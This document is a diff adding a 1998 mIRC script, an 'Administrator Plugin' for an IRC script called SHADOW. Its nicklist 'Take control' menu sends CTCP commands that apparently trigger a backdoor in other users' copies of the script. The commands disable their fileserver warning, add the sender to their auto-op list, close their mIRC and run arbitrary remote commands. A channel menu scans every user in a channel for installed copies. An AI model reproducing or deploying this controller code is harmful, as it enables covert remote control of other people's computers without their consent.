@@ -1,0 +1,57 @@
+; Administrator Plugin for S|-|ADO\\' v1.0 (07-03-1998)
+; Plugin for S|-|ADO\\'
+; developed by RoboCop (irc.germany.net)
+;
+;-=-= BEGIN SHADOW PLUGIN DEFINITION =-=-
+;name: Administrator Plugin 1.0
+;auth: RoboCop of nOOb
+; 
+;-=-= END SHADOW PLUGIN DEFINITION =-=-
+
+menu channel {
+  SPI: Admin
+  .Show users using S|=|aÐo\\'
+  ..CTCP Method: showShadows
+  ..TEXT Method: msg $chan 1,8 S|-|AÐO\\' - Script  by RoboCop and Speedy
+}
+
+menu status {
+  SPI: Admin
+  .SupervisoR mode
+  ..ON: if ( %sr == $null ) { set %sr Variable for SHADOWs SupervisoR mode | echo -s 1,8 S|-|ADO\\'s 1,9 Admin  SupervisoR mode is now 9enabled. } | else { echo -s 1,8 S|-|ADO\\'s 1,9 Admin  SupervisoR mode is already 9enabled. }
+  ..OFF: if ( %sr != $null ) { unset %sr | echo -s 1,8 S|-|ADO\\'s 1,9 Admin  SupervisoR mode is now 4disabled. } | else { echo -s 1,8 S|-|ADO\\'s 1,9 Admin  SupervisoR mode is already 4disabled. }
+  ..-
+  ..STATUS: if ( %sr == $null ) { echo -s 1,8 S|-|ADO\\'s 1,9 Admin  SupervisoR mode is currently 4disabled. } | else { echo -s 1,8 S|-|ADO\\'s 1,9 Admin  SupervisoR mode is currently 9enabled. }
+}
+
+menu nicklist {
+  SPI: Admin
+  .CTCP stuff
+  ..Message to programmers - Priority:
+  ...DANGER: LM 0 $$?="Enter action (Nick will be in front of MSG):"
+  ...WARNING: LM 1 $$?="Enter action (Nick will be in front of MSG):"
+  ...ATTENTION: LM 2 $$?="Enter action (Nick will be in front of MSG):"
+  ...-
+  ...Normal: LM 3 $$?="Enter action (Nick will be in front of MSG):"
+  ..CTCP message: .ctcp $$1 SDWComm $$?="Enter your message:"
+  ..-
+  ..Take control
+  ...Turn his fileserver warning off: .ctcp $$1 IFS
+  ...Set you in his auto-op list: .ctcp $$1 INS
+  ...Start his KillNickServ-Procedure: .ctcp $$1 KillNickServNow YES $me
+  ...End his mIRC: .ctcp $$1 SDWExitMirc
+  ...Remote Control: .ctcp $$1 RC $$?="What commands should (s)he do?"
+}
+
+alias -l ShowShadows {
+  %tempvar = $nick(# , 0)
+  %countvar = 1
+  :SSLabel
+  if $nick(# , %countvar ) != $me { .echo -a Sending ¢ƒŠ request to " $+ $nick(#, %countvar ) $+ " ... | .CTCP $nick(# , %countvar ) CFS }
+  %countvar = %countvar + 1
+  if %countvar > %tempvar {
+    unset %tempvar
+    unset %countvar
+  }
+  else goto SSLabel
+}
